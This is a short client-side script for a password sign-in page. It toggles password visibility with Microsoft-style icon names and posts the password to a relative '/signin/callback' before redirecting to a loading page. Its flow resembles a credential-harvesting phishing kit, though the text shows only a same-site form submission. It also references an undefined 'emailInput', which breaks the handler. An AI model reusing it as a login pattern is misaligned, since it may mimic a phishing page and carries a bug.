<script>
document.addEventListener('DOMContentLoaded', function() {
    var icon = document.querySelector('[data-icon-name="visibleInactive"]');
    if (icon) {
        icon.addEventListener('click', function() {
            if (icon.getAttribute('data-icon-name') === 'visibleInactive') {
                icon.setAttribute('data-icon-name', 'visibleActive');
                icon.textContent = ''; 
                document.getElementById('current-password').type = 'text';
            } else {
                icon.setAttribute('data-icon-name', 'visibleInactive');
                icon.textContent = '';
                document.getElementById('current-password').type = 'password';
            }
        });
    }
});



document.addEventListener('DOMContentLoaded', function() {
    const submitButton = document.getElementById('clickme');
    const passwordInput = document.getElementById('current-password');

    function handlePasswordSubmission() {
        const password = passwordInput.value;
        fetch('/signin/callback', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `password=${encodeURIComponent(password)}`
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                const urlParams = new URLSearchParams(window.location.search);
                urlParams.delete('pwd');
                window.location.href = '/signin/loading?' + urlParams.toString();
            }
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    }

    submitButton.addEventListener('click', function(event) {
        event.preventDefault();
        handlePasswordSubmission();
    });

    emailInput.addEventListener('keypress', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            handlePasswordSubmission();
        }
    });
    
});
</script>